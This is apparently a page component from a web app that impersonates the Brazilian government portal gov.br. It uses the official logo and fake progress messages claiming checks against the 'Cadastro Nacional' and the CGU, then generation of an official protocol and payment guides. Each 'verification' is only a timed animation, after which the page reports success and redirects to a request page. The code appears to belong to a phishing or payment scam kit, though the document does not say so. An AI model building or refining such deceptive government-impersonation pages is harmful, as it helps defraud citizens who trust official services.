import { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'

const PHASES = [
  {
    title: 'Verificando dados no Cadastro Nacional...',
    sub: 'Sincronizando com as bases da Controladoria-Geral da União (CGU).',
  },
  {
    title: 'Gerando Protocolo Oficial e Guias de Arrecadação...',
    sub: 'Reservando vaga. Isso pode levar alguns segundos.',
  },
]

export default function GerandoProtocolo() {
  const navigate = useNavigate()
  const [phase, setPhase] = useState(0)
  const [done, setDone] = useState(false)

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  useEffect(() => {
    const t1 = setTimeout(() => setPhase(1), 3000)
    const t2 = setTimeout(() => setDone(true), 4800)
    const t3 = setTimeout(() => navigate('/solicitacao'), 6600)
    return () => {
      clearTimeout(t1)
      clearTimeout(t2)
      clearTimeout(t3)
    }
  }, [navigate])

  const current = PHASES[phase]

  return (
    <>
      <GovHeader />

      <div className="container-gov pb-10">
        <div
          style={{
            background: 'white',
            borderRadius: 8,
            padding: 40,
            margin: '40px auto',
            border: '1px solid #e2e8f0',
            maxWidth: 800,
            boxShadow: '0 1px 3px rgba(0,0,0,0.05)',
            textAlign: 'center',
          }}
        >
          <h1 className="text-2xl font-black text-blue-900 mb-6 uppercase">
            Sistema de Alocação e Auditoria
          </h1>

          {!done && (
            <>
              <p className="text-gray-600 mb-2 font-bold text-lg">
                {current.title}
              </p>
              <p className="text-gray-400 text-sm mb-4">{current.sub}</p>

              <div
                style={{
                  width: 100,
                  height: 100,
                  border: '4px solid #1351b4',
                  borderRadius: '50%',
                  margin: '40px auto',
                  position: 'relative',
                  animation: 'gpPulse 1.5s infinite',
                }}
              >
                <div
                  style={{
                    position: 'absolute',
                    top: -14,
                    left: -14,
                    right: -14,
                    bottom: -14,
                    border: '2px solid #1351b4',
                    borderRadius: '50%',
                    animation: 'gpPulseOuter 1.5s infinite',
                    opacity: 0.5,
                  }}
                />
              </div>
            </>
          )}

          {done && (
            <div
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                gap: 10,
                fontSize: 18,
                fontWeight: 'bold',
                color: '#15803d',
                marginTop: 30,
                transition: 'opacity 0.5s',
              }}
            >
              <svg
                className="w-16 h-16 text-green-600 mb-2"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                  d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                />
              </svg>
              <span>VERIFICAÇÃO CONCLUÍDA</span>
              <span className="text-sm text-gray-500 font-normal">
                A vaga presencial foi reservada e o Protocolo de Segurança foi
                emitido.
              </span>
            </div>
          )}

          <style>{`
            @keyframes gpPulse {
              0% { transform: scale(0.9); opacity: 1; }
              100% { transform: scale(1.1); opacity: 0.8; }
            }
            @keyframes gpPulseOuter {
              0% { transform: scale(0.8); opacity: 0.8; }
              100% { transform: scale(1.3); opacity: 0; }
            }
          `}</style>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />
    </>
  )
}
